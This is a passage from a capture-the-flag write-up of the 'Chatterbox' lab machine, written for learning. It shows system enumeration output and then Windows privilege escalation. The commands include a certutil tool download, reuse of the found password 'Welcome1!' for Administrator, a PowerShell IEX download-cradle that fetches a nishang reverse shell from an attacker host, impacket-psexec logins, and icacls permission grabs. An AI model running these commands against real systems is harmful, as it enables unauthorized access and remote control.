                           [78]: KB2900986
                           [79]: KB2908783
                           [80]: KB2911501
                           [81]: KB2912390
                           [82]: KB2918077
                           [83]: KB2919469
                           [84]: KB2923545
                           [85]: KB2931356
                           [86]: KB2937610
                           [87]: KB2943357
                           [88]: KB2952664
                           [89]: KB2966583
                           [90]: KB2968294
                           [91]: KB2970228
                           [92]: KB2972100
                           [93]: KB2973112
                           [94]: KB2973201
                           [95]: KB2973351
                           [96]: KB2977292
                           [97]: KB2978742
                           [98]: KB2984972
                           [99]: KB2985461
                           [100]: KB2991963
                           [101]: KB2992611
                           [102]: KB3003743
                           [103]: KB3004361
                           [104]: KB3004375
                           [105]: KB3006121
                           [106]: KB3006137
                           [107]: KB3010788
                           [108]: KB3011780
                           [109]: KB3013531
                           [110]: KB3020370
                           [111]: KB3020388
                           [112]: KB3021674
                           [113]: KB3021917
                           [114]: KB3022777
                           [115]: KB3023215
                           [116]: KB3030377
                           [117]: KB3035126
                           [118]: KB3037574
                           [119]: KB3042058
                           [120]: KB3045685
                           [121]: KB3046017
                           [122]: KB3046269
                           [123]: KB3054476
                           [124]: KB3055642
                           [125]: KB3059317
                           [126]: KB3060716
                           [127]: KB3061518
                           [128]: KB3067903
                           [129]: KB3068708
                           [130]: KB3071756
                           [131]: KB3072305
                           [132]: KB3074543
                           [133]: KB3075226
                           [134]: KB3078601
                           [135]: KB3078667
                           [136]: KB3080149
                           [137]: KB3084135
                           [138]: KB3086255
                           [139]: KB3092627
                           [140]: KB3093513
                           [141]: KB3097989
                           [142]: KB3101722
                           [143]: KB3102429
                           [144]: KB3107998
                           [145]: KB3108371
                           [146]: KB3108381
                           [147]: KB3108664
                           [148]: KB3109103
                           [149]: KB3109560
                           [150]: KB3110329
                           [151]: KB3118401
                           [152]: KB3122648
                           [153]: KB3123479
                           [154]: KB3126587
                           [155]: KB3127220
                           [156]: KB3133977
                           [157]: KB3137061
                           [158]: KB3138378
                           [159]: KB3138612
                           [160]: KB3138910
                           [161]: KB3139398
                           [162]: KB3139914
                           [163]: KB3140245
                           [164]: KB3147071
                           [165]: KB3150220
                           [166]: KB3150513
                           [167]: KB3156016
                           [168]: KB3156019
                           [169]: KB3159398
                           [170]: KB3161102
                           [171]: KB3161949
                           [172]: KB3161958
                           [173]: KB3172605
                           [174]: KB3177467
                           [175]: KB3179573
                           [176]: KB3184143
                           [177]: KB3185319
                           [178]: KB4014596
                           [179]: KB4019990
                           [180]: KB4040980
                           [181]: KB976902
                           [182]: KB982018
                           [183]: KB4054518
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection 4
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.74


```

- we can also run the `whoami /all` command

```shell
c:\Windows\Temp\scripts>whoami /all                                                                                                                                    
whoami /all                                                                                                                                                            
                                                                                                                                                                       
USER INFORMATION                                                                                                                                                       
----------------                                                                                                                                                       
                                                                                                                                                                       
User Name         SID                                                                                                                                                  
================= =============================================                                                                                                        
chatterbox\alfred S-1-5-21-1218242403-4263168573-589647361-1000                                                                                                        
                                                                                                                                                                       
                                                                                                                                                                       
GROUP INFORMATION                                                                                                                                                      
-----------------                                                                                                                                                      
                                                                                                                                                                       
Group Name                             Type             SID          Attributes                                                                                        
====================================== ================ ============ ==================================================                                                
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group                                                
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group                                                
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group                                                
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group                                                
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group                                                
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group                                                
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group                                                
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group                                                
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group                                                
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192  Mandatory group, Enabled by default, Enabled group                                                
                                                                                                                                                                       
                                                                                                                                                                       
PRIVILEGES INFORMATION                                                                                                                                                 
----------------------                                                                                                                                                 
                                                                                                                                                                       
Privilege Name                Description                          State                                                                                               
============================= ==================================== ========                                                                                            
SeShutdownPrivilege           Shut down the system                 Disabled                                                                                            
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled                                                                                             
SeUndockPrivilege             Remove computer from docking station Disabled                                                                                            
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled                                                                                            
SeTimeZonePrivilege           Change the time zone                 Disabled  
```
#### Privilege Escalation

- so we can import out winPEAS script to look for Privilege Escalation vectors `certutil.exe -urlcache -split -f http://10.10.14.7/winPEAS.bat winPEASx64.bat`

- we can see that some patches are not installed on the system

![](assets/ChatterBox_assets/Pasted%20image%2020230619112746.png)

- we also discover some credentials as well

![](assets/ChatterBox_assets/Pasted%20image%2020230619112944.png)

- so we can attempt using the credentials found, Alfred and Welcome! with smbclient and we can see that we can list the shares now

![](assets/ChatterBox_assets/Pasted%20image%2020230619125102.png)

- So now that we found some credentials, why don't we try reusing the password found for the Administrator account instead?
- using powershell, so firstly we create PSCredential Objects using the commands

```shell
$passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force;$creds = New-Object System.Management.Automation.PSCredential('administrator',$passwd)
```

- then we can get a reverse shell in our listener using the command

```shell
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.14.3/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 4443" -Credential $creds
```
- so what we did with the command above is we imported and executed a reverse powershell script at [nishang/Shells/Invoke-PowerShellTcp.ps1 at master · samratashok/nishang (github.com)](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
- so we have a python server spun up in the directory containing this powershell script and we also have the netcat listener on port 4443 to receive the reverse shell

- so we can see that we have a Powershell shell

![](assets/ChatterBox_assets/Pasted%20image%2020230621091527.png)

- or we can get a can just use psexec with those credentials and get a regular shell  `impacket-psexec 'CHATTERBOX/Administrator:Welcome1!@10.10.10.74'` or `impacket-psexec 'Administrator:Welcome1!@10.10.10.74'`

- and we get a shell

![](assets/ChatterBox_assets/Pasted%20image%2020230619172026.png)

#### Another way to view the root.txt ???
- so without the administrator access, we discovered we had access to the administrator's directory
- but we can't view the root.txt file??

![](assets/ChatterBox_assets/Pasted%20image%2020230619162831.png)

- so how do we have access permissions to the Administrator's directory but not the root.txt file

![](assets/ChatterBox_assets/Pasted%20image%2020230619162154.png)

- lets attempt to add Full permissions to Alfred for the root file using the command `icacls c:\Users\Administrator\Desktop\root.txt /grant CHATTERBOX\Alfred:(F)` and now we have access to the root.txt file without administrator access!!!

![](assets/ChatterBox_assets/Pasted%20image%2020230619162448.png)

- other commands we can run that will do the same thing as icals are

```
- cacls "path_to_file" /E /G "username":(permissions)
- takeown /F "path_to_file"
```

Thank you for Reading my writeup, see you next time :)
